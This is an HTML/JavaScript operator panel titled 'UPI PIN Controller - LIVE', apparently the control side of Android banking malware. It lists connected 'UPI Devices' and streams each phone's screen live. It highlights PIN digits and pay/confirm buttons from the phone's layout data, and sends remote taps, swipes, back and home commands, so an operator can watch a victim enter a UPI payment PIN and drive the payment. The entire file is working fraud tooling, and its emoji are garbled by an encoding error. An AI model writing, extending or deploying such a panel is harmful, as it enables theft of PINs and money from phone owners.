<!DOCTYPE html>
<html>
<head>
    <title>üì± UPI PIN Controller - LIVE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
            background: #0a0a0a; color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; background: rgba(0,0,0,0.95); 
            padding: 20px; max-height: 85vh; overflow-y: auto; width: 300px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
        }
        .device { padding: 15px; margin: 10px 0; background: #222; cursor: pointer; 
            border-radius: 10px; transition: all 0.3s; border: 1px solid #444; }
        .device:hover { background: #444; transform: translateX(8px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; box-shadow: 0 0 20px #00ff88; }
        .disconnected { opacity: 0.4; }

        #phone-frame {
            width: 390px; height: 850px; margin: 20px auto; 
            background: #111; border: 35px solid #222; border-radius: 70px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.9), inset 0 0 25px rgba(255,255,255,0.1);
        }
        #screen-canvas { 
            width: 100%; height: 100%; background: #000; border-radius: 30px;
            image-rendering: pixelated; image-rendering: -moz-crisp-edges;
        }
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            pointer-events: none; border-radius: 30px; z-index: 10;
        }
        .layout-box {
            position: absolute; border: 3px solid #00ff88; background: rgba(0,255,136,0.25);
            border-radius: 6px; transition: all 0.15s ease; pointer-events: none;
        }
        .pin-box { border-color: #ff4444 !important; background: rgba(255,68,68,0.35) !important; }
        .pin-text { 
            position: absolute; font-size: 14px; font-weight: bold; color: #00ff88;
            background: rgba(0,0,0,0.8); padding: 2px 6px; border-radius: 4px;
            white-space: nowrap; font-family: monospace;
        }
        .pin-text.pin { color: #ff4444 !important; }

        #stats { 
            position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
            padding: 18px; border-radius: 12px; font-size: 13px; text-align: center; 
            backdrop-filter: blur(15px); border: 1px solid #333; min-width: 200px;
        }
        #controls { 
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 12px; background: rgba(0,0,0,0.95); padding: 18px 28px;
            border-radius: 35px; backdrop-filter: blur(25px); border: 1px solid #444;
        }
        button {
            padding: 14px 24px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 25px; cursor: pointer; 
            font-weight: 600; transition: all 0.3s; box-shadow: 0 6px 25px rgba(0,123,255,0.4);
            font-size: 14px;
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 10px 35px rgba(0,123,255,0.6); }
        .layout-btn { background: linear-gradient(45deg, #ff6b6b, #ee5a5a); }
        .layout-btn.active { background: linear-gradient(45deg, #00ff88, #00cc6a); }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 18px; color: #00ff88;">üì± UPI Devices LIVE</h3>
        <div id="device-list">üîÑ Loading...</div>
    </div>
    
    <div id="stats">
        <div>Status: <span id="status" style="color: #ff6b6b;">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Ping: <span id="ping">-</span></div>
        <div>Device: <span id="deviceName">-</span></div>
        <div id="layoutCount" style="font-size: 12px; color: #aaa;">Elements: 0</div>
    </div>

    <div id="phone-frame">
        <canvas id="screen-canvas"></canvas>
        <div id="layout-overlay"></div>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendHome()">üè† Home</button>
        <button class="layout-btn" id="layoutBtn" onclick="toggleLayout()">üó∫Ô∏è Layout OFF</button>
        <button onclick="toggleFullScreen()">üì± Fullscreen</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'], timeout: 20000 });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let frameCount = 0, lastFrameTime = 0, avgFps = 0;
        let frameQueue = [];
        let isDragging = false, dragStart = {};
        let showLayout = false;
        let layoutElements = [];
        let canvas, phoneFrame, overlayDiv;

        // üî• Initialize DOM elements
        canvas = document.getElementById('screen-canvas');
        phoneFrame = document.getElementById('phone-frame');
        overlayDiv = document.getElementById('layout-overlay');

        socket.on('connect', () => {
            document.getElementById('status').textContent = 'üü¢ LIVE 30FPS';
            document.getElementById('status').style.color = '#00ff88';
            pingInterval = setInterval(() => {
                socket.emit('ping');
                document.getElementById('ping').textContent = Math.round(socket.io.engine.ping.latency) + 'ms';
            }, 2000);
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            frameQueue.push(data);
            if (frameQueue.length === 1) renderNextFrame();
            
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                avgFps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                document.getElementById('fps').textContent = avgFps;
                frameCount = 0;
                lastFrameTime = now;
            }
        });

        function renderNextFrame() {
            if (frameQueue.length === 0) return;
            
            const data = frameQueue.shift();
            const img = new Image();
            
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                const screenCtx = canvas.getContext('2d');
                screenCtx.imageSmoothingEnabled = false;
                screenCtx.clearRect(0, 0, canvas.width, canvas.height);
                screenCtx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                // üî• Render layout elements
                if (showLayout && data.layout && data.layout.length > 0) {
                    renderLayoutElements(data.layout, rect);
                }
                
                if (frameQueue.length > 0) {
                    requestAnimationFrame(renderNextFrame);
                }
            };
            
            img.onerror = () => {
                if (frameQueue.length > 0) requestAnimationFrame(renderNextFrame);
            };
            
            img.src = `data:image/jpeg;base64,${data.data}`;
            deviceWidth = data.width || 1080;
            deviceHeight = data.height || 2400;
            
            document.getElementById('layoutCount').textContent = 
                `Elements: ${data.layout ? data.layout.length : 0}`;
        }

        function renderLayoutElements(layout, rect) {
            layoutElements = [];
            overlayDiv.innerHTML = '';
            
            layout.forEach((element, index) => {
                const x = (element.bounds.left / deviceWidth) * rect.width;
                const y = (element.bounds.top / deviceHeight) * rect.height;
                const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
                const h = ((element.bounds.bottom - element.bounds.top) / deviceHeight) * rect.height;
                
                const isPin = isPinElement(element);
                const boxClass = isPin ? 'layout-box pin-box' : 'layout-box';
                
                // üî• Create visual box
                const box = document.createElement('div');
                box.className = boxClass;
                box.style.left = `${x}px`;
                box.style.top = `${y}px`;
                box.style.width = `${w}px`;
                box.style.height = `${h}px`;
                
                // üî• PIN text label
                const label = document.createElement('div');
                label.className = 'pin-text ' + (isPin ? 'pin' : '');
                const displayText = element.text || element.contentDescription || 'PIN';
                label.textContent = displayText.length > 8 ? displayText.slice(0,8) + '..' : displayText;
                label.style.left = `${x + 4}px`;
                label.style.top = `${y + 4}px`;
                
                overlayDiv.appendChild(box);
                overlayDiv.appendChild(label);
                
                // üî• Store for click detection
                layoutElements.push({
                    x, y, w, h, 
                    deviceX: element.bounds.centerX,
                    deviceY: element.bounds.centerY,
                    isPin,
                    element,
                    box
                });
            });
        }

        function isPinElement(element) {
            const text = (element.text || '').trim();
            const desc = (element.contentDescription || '').trim();
            return (text.match(/^\d$/) || desc.match(/^\d$/)) || 
                   text.toLowerCase().includes('done') || 
                   text.toLowerCase().includes('pay') ||
                   text.toLowerCase().includes('confirm') ||
                   desc.toLowerCase().includes('pin');
        }

        function updateDeviceList(devices) {
            const list = document.getElementById('device-list');
            list.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${(info.model || id).slice(0,14)}</b><br>
                        <small>${info.brand || 'Android'}</small><br>
                        <span style="color: ${info.connected ? '#00ff88' : '#ff6b6b'}">
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}
                        </span>
                    </div>
                `).join('') : '<div style="color:#666; padding:20px;">No UPI devices<br>üîÑ Waiting...</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.getElementById('deviceName').textContent = deviceId.slice(0,12);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            frameQueue = [];
            console.log('üéØ Selected device:', deviceId);
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
            };
        }

        // üî• Touch & Mouse Events
        const events = ['mousedown', 'mousemove', 'mouseup', 'touchstart', 'touchmove', 'touchend'];
        events.forEach(event => {
            phoneFrame.addEventListener(event, handleInput, { passive: false });
        });

        function handleInput(e) {
            e.preventDefault();
            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
            const clientY = e.touches ? e.touches[0].clientY : e.clientY;
            const coords = getScaledCoords(clientX, clientY);
            
            if (e.type.includes('start') || e.type === 'mousedown') {
                isDragging = true;
                dragStart = coords;
            } else if ((e.type.includes('move') || e.type === 'mousemove') && isDragging) {
                sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
            } else if (e.type.includes('end') || e.type === 'mouseup') {
                isDragging = false;
                sendTap(coords.x, coords.y);
            }
        }

        phoneFrame.addEventListener('click', (e) => {
            if (!showLayout || !currentDevice) return;
            
            const rect = phoneFrame.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            // üî• Check layout element click first
            const clickedElement = layoutElements.find(el => 
                x >= el.x && x <= el.x + el.w && y >= el.y && y <= el.y + el.h
            );
            
            if (clickedElement) {
                sendTap(clickedElement.deviceX, clickedElement.deviceY);
                clickedElement.box.style.background = 'rgba(255,255,0,0.5)';
                setTimeout(() => {
                    clickedElement.box.style.background = clickedElement.isPin ? 
                        'rgba(255,68,68,0.35)' : 'rgba(0,255,136,0.25)';
                }, 200);
                console.log('üéØ UPI PIN CLICKED:', clickedElement.element.text || clickedElement.element.contentDescription);
                return;
            }
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey, duration: 300 
            });
        }

        function sendBack() { 
            if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); 
        }
        function sendHome() { 
            if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); 
        }

        function toggleLayout() {
            showLayout = !showLayout;
            const btn = document.getElementById('layoutBtn');
            btn.textContent = showLayout ? '‚úÖ Layout ON' : 'üó∫Ô∏è Layout OFF';
            btn.classList.toggle('active');
            document.getElementById('layoutCount').style.color = showLayout ? '#00ff88' : '#aaa';
            console.log('üìç Layout:', showLayout ? 'ON - UPI Pins visible' : 'OFF');
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch(() => {});
            } else {
                document.exitFullscreen();
            }
        }

        // üî• Auto-connect first device
        setTimeout(() => {
            const firstDevice = document.querySelector('.device');
            if (firstDevice) firstDevice.click();
        }, 2000);
    </script>
</body>
</html>
